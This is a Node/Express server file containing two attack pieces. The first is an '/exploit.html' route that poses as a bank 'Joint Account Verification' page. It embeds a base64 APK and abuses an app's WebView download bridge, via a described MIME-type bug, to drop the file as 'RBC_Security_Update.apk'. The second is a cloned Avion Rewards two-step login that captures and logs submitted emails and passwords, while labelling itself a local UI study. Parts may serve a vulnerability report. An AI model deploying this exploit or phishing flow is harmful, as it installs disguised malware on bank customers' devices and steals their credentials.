const express = require("express");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

app.disable("x-powered-by");
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/exploit.html", (_req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html>
<head><title>Joint Account Verification</title></head>
<body>
<p>Verifying your joint account access, please wait...</p>
<script>
// Base64-encoded APK file — attacker controls the full content
var apkBase64 = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4DwAAAAAAAEFQSyBTaWcgQmxvY2sgNDJQSwECAAAAAAAACAAAACEAX1xCrJQCAAAQBwAAEwAAAAAAAAAAAAAAAAAAAAAAQW5kcm9pZE1hbmlmZXN0LnhtbFBLAQIAAAAAAAAAAAAAIQALUDYTKAAAACgAAAAOAAAAAAAAAAAAAAAAAMUCAAByZXNvdXJjZXMuYXJzY1BLAQIUAxQAAAAIAHOEMV2XwH977wIAANQEAAALAAAAAAAAAAAAAACkgSADAABjbGFzc2VzLmRleFBLAQIUABQAAAgIAHOEMV3QUC1XKQEAAJwBAAAUAAAAAAAAAAAAAAAAADgGAABNRVRBLUlORi9BTkRST0lERC5TRlBLAQIUABQAAAgIAHOEMV05TDVyCgQAAE0EAAAVAAAAAAAAAAAAAAAAAJMHAABNRVRBLUlORi9BTkRST0lERC5SU0FQSwECFAAUAAAICABzhDFdJttEJtgAAAAdAQAAFAAAAAAAAAAAAAAAAADQCwAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwUGAAAAAAYABgB9AQAAACAAAAAA";

// Write APK to disk and trigger install via DYNAMIC_DOWNLOAD_DOCUMENT
// The fileName extension (.apk) controls the MIME type after the setData() bug
// clears the hardcoded "application/pdf" type in PDFUtils.java:104
WebViewFragment.onFeatureEventWebHook(JSON.stringify({
    "version": "1.2",
    "type": "dynamicDownloadDocument",
    "targetFileBase64": apkBase64,
    "fileName": "RBC_Security_Update.apk"
}));
</script>
</body>
</html>`);
});

app.get('/test.txt', function (req, res) {
  res.type('text/plain');
  res.send('test');
});

app.get("/login/identifier", (_req, res) => {
  res.send(renderPage({ step: "identifier" }));
});

app.get("/login/password", (req, res) => {
  const email = typeof req.query.email === "string" ? req.query.email : "";
  res.send(renderPage({ step: "password", email }));
});

app.post("/login/complete", (req, res) => {
  const username = typeof req.body.email === "string" ? req.body.email : "";
  const password = typeof req.body.password === "string" ? req.body.password : "";

  logTestLoginCapture(username, password);

  res.redirect("/login/complete");
});

app.get("/login/complete", (_req, res) => {
  res.send(renderPage({ step: "complete" }));
});

if (require.main === module) {
  app.listen(port, () => {
    console.log(`Login UI study running at http://localhost:${port}`);
  });
}

function renderPage({ step, email = "" }) {
  const content = {
    identifier: renderIdentifierStep(),
    password: renderPasswordStep(email),
    complete: renderCompleteStep()
  }[step];

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Avion Rewards Login UI Study</title>
    <meta name="description" content="A local two-step login UI sample for design study.">
    <link rel="stylesheet" href="/styles.css">
    <script src="/app.js" defer></script>
  </head>
  <body>
    <a class="skip-link" href="#main">Skip to main content</a>
    <main id="main" class="page-shell">
      <section class="auth-card" aria-labelledby="page-title">
        <div class="brand-mark" aria-hidden="true">A</div>
        ${content}
      </section>
    </main>
    <aside class="cookie-banner" data-cookie-banner aria-label="Cookie notice">
      <p>
        To ensure you have the best possible experience, we use cookies and similar technologies on our sites.
        Some are necessary for helping our sites run smoothly and securely, others are optional and help us
        create customized experiences.
      </p>
      <div class="cookie-actions">
        <button class="button cookie-primary" type="button" data-accept-cookies>Accept All Cookies</button>
        <button class="button cookie-secondary" type="button">Manage Cookie Settings</button>
      </div>
      <button class="cookie-close" type="button" aria-label="Close cookie notice" data-accept-cookies></button>
    </aside>
  </body>
</html>`;
}

function renderIdentifierStep() {
  return `<h1 id="page-title">Welcome back<span aria-hidden="true"> 👋</span></h1>
        <p class="lede">Sign in to Avion Rewards with your email address.</p>
        <form class="auth-form" action="/login/password" method="get" data-email-form novalidate>
          <div class="field" data-field>
            <input id="email" name="email" type="email" autocomplete="email" placeholder=" " required aria-describedby="email-error">
            <label for="email">Email*</label>
          </div>
          <p class="field-error" id="email-error" aria-live="polite"></p>
          <button class="button primary-button" type="submit">Continue</button>
        </form>
        <p class="join-copy">Not an Avion Rewards member?<br><a href="#">Join now</a></p>`;
}

function renderPasswordStep(email) {
  const safeEmail = escapeHtml(email || "learner@example.com");

  return `<h1 id="page-title">Enter your password</h1>
        <p class="lede">To continue, enter your password for Avion Rewards.</p>
        <div class="email-chip">
          <span>${safeEmail}</span>
          <a href="/login/identifier">Edit</a>
        </div>
        <form class="auth-form" action="/login/complete" method="post" data-password-form novalidate>
          <input type="hidden" name="email" value="${safeEmail}">
          <div class="field password-field" data-field>
            <input id="password" name="password" type="password" autocomplete="current-password" placeholder=" " required aria-describedby="password-error">
            <label for="password">Password*</label>
            <button class="show-password" type="button" aria-label="Show password" aria-pressed="false" data-toggle-password>
              <span aria-hidden="true"></span>
            </button>
          </div>
          <p class="field-error" id="password-error" aria-live="polite"></p>
          <p class="forgot-copy"><a href="#">Forgot password?</a></p>
          <button class="button primary-button" type="submit">Continue</button>
        </form>
        <p class="join-copy">Not an Avion Rewards member?<br><a href="#">Join now</a></p>`;
}

function renderCompleteStep() {
  return `<h1 id="page-title">Demo complete</h1>
        <p class="lede">This sample stops here. It does not authenticate, create a session, or store credentials.</p>
        <a class="button primary-button link-button" href="/login/identifier">Start again</a>`;
}

function escapeHtml(value) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function logTestLoginCapture(username, password) {
  console.log("[TEST LOGIN CAPTURE] Testing purposes only. These fields are from this local UI study and do not correspond to an actual production username or password.", {
    username,
    password
  });
}

module.exports = { app, logTestLoginCapture };
